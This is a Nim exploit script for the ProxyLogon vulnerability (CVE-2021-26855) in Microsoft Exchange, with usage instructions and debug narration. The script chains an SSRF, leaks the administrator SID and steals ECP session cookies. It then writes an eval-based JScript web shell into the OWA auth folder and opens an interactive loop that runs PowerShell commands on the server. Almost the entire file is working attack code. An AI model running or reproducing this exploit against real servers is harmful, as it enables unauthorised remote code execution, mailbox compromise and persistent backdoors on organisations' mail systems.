import httpclient
import random
import logging
import os
import strformat
import net
import strutils

echo """
  _____                     _                             
 |  __ \                   | |                            
 | |__) | __ _____  ___   _| |     ___   __ _  ___  _ __  
 |  ___/ '__/ _ \ \/ / | | | |    / _ \ / _` |/ _ \| '_ \ 
 | |   | | | (_) >  <| |_| | |___| (_) | (_| | (_) | | | |
 |_|   |_|  \___/_/\_ \__, |______\___/ \__, |\___/|_| |_|
                       __/ |             __/ |            
                      |___/             |___/                                                                     
                                                                                                                          
Original PoC by https://github.com/testanull
Inspired from the exploit of hausec: https://github.com/hausec
Author: @t0                                                                                        
"""

#[
##########################################################################
TO DO :
- Find how to use argparse
##########################################################################
]#

# Function to generate random string of three characters
proc rndStr: string =
  for _ in .. 3:
    add(result, char(rand(int('a') .. int('z'))))

if paramCount() < 2:
  echo "Script in nim for proxylogon. Usage :"
  echo "./proxylogon <ip_or_dns_name> <email_address> (<debug> to launch in debug mode) (<self> if the certificate is self-signed).\n"
  echo "Example :"
  echo "./proxylogon 192.168.1.1 administrator@lab.org self"
  quit(QuitFailure)

const
  payload_name: string = "shell.aspx"
  user_agent: string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
  shell_content = """<script language=\"JScript\" runat=\"server\"> function Page_Load(){eval(Request[\"data\"],\"unsafe\");}</script>"""
  legacyDnPatchByte = "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"

let
  target: string = paramStr(1)
  email: string = paramStr(2)
  random_name: string =  &"{rndStr()}.js"
  shell_path: string = &"""Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%{payload_name}"""
  shell_absolute_path: string = &"""\\\\127.0.0.1\\c$\\{shell_path}"""
  autoDiscoverBody: string = &"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>{email}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" 

var defaultSSLContext = newContext()
var logger = newConsoleLogger(fmtStr="[$time] - ")
var debug: int = 0

if paramCount() > 2:
  for string in commandLineParams():
# Define if a self signed certificate is used
    if string == "self":
      destroyContext(defaultSSLContext)
      var defaultSSLContext = newContext(verifyMode=CVerifyNone)
# Define if debug mode is enabled
    if string == "debug":
      debug = 1

# Enable or not the debug mode
case debug
of 1:
  setLogFilter(lvlDebug)
else:
  setLogFilter(lvlInfo) 
addHandler(logger)


info(&"Target: {target}")
info(&"Email: {email}")
info("=============================")
info("[+] Attempting SSRF")
var FQDN: string = target

let client = newHttpClient(sslContext = defaultSSLContext)
client.headers = newHttpHeaders({
  "Cookie": "X-BEResource=localhost~1942062522", 
  "User-Agent": user_agent
})
var response = client.request(&"https://{target}/ecp/{random_name}")
debug("The cookie X-BEResource=localhost~1942062522 is used to leak the FQDN.")
debug("It checks if X-CalculatedBETarget exists. If so, the FQDN is changed to X-FEserver header")
debug(response.headers)
debug("this is the answer:")
debug(response.body)
debug(&"End of the request : https://{target}/ecp/{random_name}")

if len(response.headers["x-calculatedbetarget"]) != 0 and len(response.headers["x-feserver"]) != 0:
  FQDN = response.headers["X-FEServer"]

client.headers = newHttpHeaders ({
  "Cookie": &"X-BEResource={FQDN}/autodiscover/autodiscover.xml?a=~1942062522;",
  "Content-Type": "text/xml",
  "User-Agent": user_agent
})

response = client.post(&"https://{target}/ecp/{random_name}", body=autoDiscoverBody)
debug(&"Post request done on https://{target}>/ecp/{random_name}. It searches for a legacyDN in the answer using the XBEResource cookie with the FQDN and the autodiscover (header and in the cookie).")
debug("Then it cuts to extract it")

debug(response.body)
debug(response.headers)
debug(response.code.int)

if response.code.int != 200:
  error("Autodiscover Error!")
  quit(QuitFailure)
if "<LegacyDN>" notin response.body:
  error("Can not get LegacyDN!")
  quit(QuitFailure)


let legacyDn: string = response.body.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
info(&"DN: {legacyDN}")

debug("mapi_body = legacyDn + a lot of bytes : \x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00")
debug("A mapi request is sent (Messaging Application Programming Interface, API used to communicate with the MS Exchange servers to check mailboxes.")

debug("The goal of this request is to find the SID of the admin mail account.")

let mapi_body: string = &"{legacyDn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

client.headers = newHttpHeaders({
  "Cookie": &"X-BEResource=Administrator@{FQDN}:444/mapi/emsmdb?MailboxId=c8c9275b-4f46-4d48-9096-f0ec2e4ac8eb@lab.local&a=~1942062522;",
  "Content-Type": "application/mapi-http",
  "X-Requesttype": "Connect",
  "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
  "X-Clientapplication": "Outlook/15.0.4815.1002",
  "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
  "User-Agent": user_agent
})

response = client.post(&"https://{target}/ecp/{random_name}", body=mapi_body)

debug(response.body)
debug(response.code)

if response.code.int != 200 or "act as owner of a UserMailbox" notin response.body:
    error("Mapi Error!")
    quit(QuitFailure)

var sid: string = response.body.split("with SID ")[1].split(" and MasterAccountSid")[0]
if sid.rsplit("-",1)[1] == "500":
  info(&"SID: {sid}")
if sid.rsplit("-",1)[1] != "500":
  info(&"Original SID: {sid}")
  let split: string = sid.rsplit("-",1)[0]
  sid = "&{split}-500"
  info(&"Corrected SID: {sid}")


info("[+] SSRF Successful!")
info("[+] Attempting Arbitrary File Write")

let proxyLogon_request: string = &"""<r at="Negotiate" ln="john"><s>{sid}</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
"""

debug("The body of the POST request also contains the SID of that user. In response, the server returns two cookies named ASP.NET_SessionId and msExchEcpCanary that the attacker can use for any future ECP requests. Obtaining these cookies is the end result of the attacker exploiting the ProxyLogon vulnerability (CVE-2021-26855)")

client.headers = newHttpHeaders({
  "Cookie": &"X-BEResource=Administrator@{FQDN}:444/ecp/proxyLogon.ecp?a=~1942062522;",
  "msExchLogonAccount": &"{sid}",
  "msExchLogonMailbox": &"{sid}",
  "msExchTargetMailbox": &"{sid}",
  "Content-Type": "text/xml",
  "User-Agent": user_agent
})

response = client.post(&"https://{target}/ecp/{random_name}", body=proxyLogon_request)

debug("Result of the post request :")
debug(response.code.int)
debug(response.headers)

if response.code.int != 241 or hasKey(response.headers, "set-cookie") == false:
    error("[-] Proxylogon Error!")
    quit(QuitFailure)

var sess_id: string
var msExchEcpCanary: string

for key,value in response.headers:
  if "ASP.NET_SessionId=" in value:
    sess_id = value.split("ASP.NET_SessionId=")[1].split(";")[0]
  if "msExchEcpCanary" in value:
    msExchEcpCanary = value.split("msExchEcpCanary=")[1].split(";")[0]

info(&"SessionID: {sess_id}")
info(&"CanaryToken: {msExchEcpCanary}")

info("Now it's RCE time. It uses the previous sess_id and canarytoken to execute actions")

info("First it tests if authentication works")

client.headers = newHttpHeaders({
  "Cookie": &"X-BEResource=Admin@{FQDN}:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary}",
  "msExchLogonAccount": &"{sid}",
  "msExchLogonMailbox": &"{sid}",
  "msExchTargetMailbox": &"{sid}",  
  "User-Agent": user_agent
})

response = client.request(&"https://{target}/ecp/{random_name}")

debug("If status code is 200, it's ok")
info(response.code)
if response.code.int != 200:
    info("[+] Wrong canary!")
    info("[+] Sometime we can skip this ...")

debug("Send a request to the DDI service (specific cookie) to find the OAB id.")
client.headers = newHttpHeaders ({
  "Cookie": &"X-BEResource=Admin@{FQDN}:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary}",
  "Content-Type": "application/json; charset=utf-8",
  "msExchLogonAccount": &"{sid}",
  "msExchLogonMailbox": &"{sid}",
  "msExchTargetMailbox": &"{sid}",  
  "User-Agent": user_agent
})

let json: string = """{"filter": { "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}}"""

response = client.post(&"https://{target}/ecp/{random_name}", body=json)

debug(response.body)

if response.code.int != 200:
  error("[-] GetOAB Error!")
  quit(QuitFailure)
let oabId: string = response.body.split("\"RawIdentity\":\"")[1].split("\"")[0]
info(&"OABId: {oabId}")

debug("Now it sends a post request to reset the oab virtual folder. When it's done, the web interface expose two parameters, internal URL and external URL which can be controled by the user. We reset the external URL to inject our payload.")

let oab_json: string = """{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": """" & oabId & """"}, "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "ExternalUrl": "https://ffff/#""" & shell_content & """"}}}"""

client.headers = newHttpHeaders ({
  "Cookie": &"X-BEResource=Admin@{FQDN}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary}",
  "Content-Type": "application/json; charset=utf-8",
  "msExchLogonAccount": &"{sid}",
  "msExchLogonMailbox": &"{sid}",
  "msExchTargetMailbox": &"{sid}",  
  "User-Agent": user_agent
})

response = client.post(&"https://{target}/ecp/{random_name}", body=oab_json)

debug(response.body)
debug(response.code)
if response.code.int != 200:
    error("[-] Set external url Error!")
    quit(QuitFailure)

debug("Saving the configuration.")

let reset_oab_body: string = """{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": """" & oabId & """"}, "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "FilePathName": """" & shell_absolute_path & """"}}}"""

client.headers = newHttpHeaders({
  "Cookie": &"X-BEResource=Admin@{FQDN}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary}",
  "Content-Type": "application/json; charset=utf-8",
  "msExchLogonAccount": &"{sid}",
  "msExchLogonMailbox": &"{sid}",
  "msExchTargetMailbox": &"{sid}",  
  "User-Agent": user_agent
})

response = client.post(&"https://{target}/ecp/{random_name}", body=reset_oab_body)

debug(response.body)
debug(response.code)

if response.code.int != 200:
    error(&"[-] Error writing the shell. Status code returned {response.code}")
    quit(QuitFailure)

info("[+] Success! Entering webshell. Type 'quit' or 'exit' to escape.\n")

var cmd: string = "a"
var payload: string
var output: string
while cmd != "exit" or cmd != "quit":
  cmd = readLine(stdin)
  if cmd == "exit" or cmd == "quit":
    quit()
  client.headers = newHttpHeaders({
    "Host": &"{FQDN}",
    "User-Agent": user_agent,
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1"
  })
  payload = &"""data=Response.Write(new ActiveXObject("WScript.Shell").exec("powershell.exe -command {cmd}").stdout.readall());"""
  response = client.post(&"https://{target}/owa/auth/{payload_name}", body=payload)
  if response.code.int != 200:
    error(&"[-] Error running command. Status code {response.code.int}")
    if response.code.int == 500:
      error("[-] Maybe AV is killing it?")
    quit()
  output = response.body.split("Name                            :")[0] 
  info(output)
